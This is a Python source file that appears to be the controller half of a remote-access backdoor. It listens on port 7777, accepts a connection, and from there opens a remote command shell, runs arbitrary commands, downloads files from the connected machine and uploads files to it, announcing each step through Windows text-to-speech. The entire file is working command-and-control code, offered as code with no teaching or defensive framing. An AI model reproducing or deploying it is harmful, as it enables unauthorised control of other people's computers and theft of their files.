import socket
import os
import win32com.client as wincl

speak = wincl.Dispatch("SAPI.SpVoice")
nightMode = False

def talk(string):
    print(string)
    if nightMode is False:
        speak.Speak(string)

talk("Initializing socket...")
s = socket.socket()

talk("Setting up host and port")

host = "127.0.0.1"
port = 7777

s.bind((host, port))
s.listen(1)

talk("Listening started at port " + str(port))

c, addr = s.accept()

talk("A session is opened in the host " + str(addr) + " at port " + str(port))

print("Type 'help' or '?' for command list")

while True:

    command = str(input(">>"))

    # Handle 'exit' command

    if command == "exit":
        talk("Trying to exit the session...")
        c.send(command.encode())

        c.close()
        talk("Session closed")

        break

    # Handle 'shell' command

    elif command == "shell":
        talk("Trying to get into the shell...")
        c.send(command.encode())

        if c.recv(1024).decode() == "shellX":
            talk("Access Granted, you are now inside the shell")
            while True:

                com = str(input("(Shell)>>"))

                if com == "exit":
                    talk("Exiting from the shell")
                    c.send(com.encode())

                    break

                else:

                    c.send(com.encode())

                    print(c.recv(1024).decode())

    # Handle 'download' command

    elif command[0:8] == "download" and command[8:9] == " " and len(command.split(" ")) == 3:
        talk("Trying to download...")
        if command.split(" ")[2] == " " or command.split(" ")[1] == " ":

            print("[-] The syntax of the command is incorrect.")
            speak.Speak("Invalid Command")
        else:

            file = command.split(" ")[1]

            destination = command.split(" ")[2]

            if os.path.exists(destination) and destination.endswith("/"):

                c.send(command.encode())

                res = c.recv(1024)

                if str(res.decode())[:3] == "ERR":

                    print("[-] The file '" + command.split(" ")[1] + "' not found")
                    speak.Speak("Sorry master that file doesnt exists")
                else:

                    filesize = int(res.decode()[6:])

                    download = open(os.getcwd() + "/new_" + file, "wb")

                    data = c.recv(1024)

                    total = len(data)

                    download.write(data)

                    while total < filesize:

                        data = c.recv(1024)

                        total += len(data)

                        download.write(data)

                    download.close()

                    if os.path.exists(destination + "new_" + file):

                        print("[?] The destination already contains a file with same name.\nDo you want to replace it? ('y' for yes)")
                        speak.Speak("Do you want to replace the file in the destination?")
                        ans = str(input("Ans:-"))

                        if ans == "y" or ans == "Y":

                            os.remove(destination + "new_" + file)

                            os.rename(os.getcwd() + "/new_" + file, destination + "new_" + file)

                            print("[+] The file '" + command.split(" ")[ 1] + "' is downloaded ===> " + destination + "new_" + file)
                            talk("File downloaded successfully")
                        else:

                            os.remove(os.getcwd() + "/new_" + file)

                            print("[-] The file is not downloaded")
                            talk(" Unable to download the file")
                    else:

                        os.rename(os.getcwd() + "/new_" + file, destination + "new_" + file)

                        print("[+] The file '" + command.split(" ")[1] + "' is downloaded ===> " + destination + "new_" + file)
                        talk("File downloaded successfully")
            else:

                print("[-] The destination is not valid")
                speak.Speak("Destination is not valid")
    elif command[0:6] == "upload" and command[6:7] == " " and len(command.split(" ")) == 3:
        talk("Trying to upload...")
        if command.split(" ")[1] == " " or command.split(" ")[2] == " " or not command.split(" ")[2].endswith("/"):

            print("[-] The syntax of the command is incorrect")
            speak.Speak("Invalid Command")
        else:

            if os.path.isfile(command.split(" ")[1]):

                c.send(command.encode())

                if c.recv(1024).decode() != "ERR":

                    size = str(os.path.getsize(command.split(" ")[1]))

                    c.send(size.encode())

                    file = open(command.split(" ")[1], "rb")

                    data = file.read(1024)

                    c.send(data)

                    while data != b"":

                        data = file.read(1024)

                        c.send(data)

                    file.close()

                    print(c.recv(1024).decode())

                else:

                    print("[-] The upload destination is invalid!")
                    speak.Speak("Invalid Destination, aborting...")
            else:

                print("[-] The specified file doesn't exists.")
                speak.Speak("Sorry sir that file doesnt exists")
    # Handle other commands and invalid commands

    else:
        talk("Trying " + command)
        c.send(command.encode())

        print(c.recv(1024).decode())
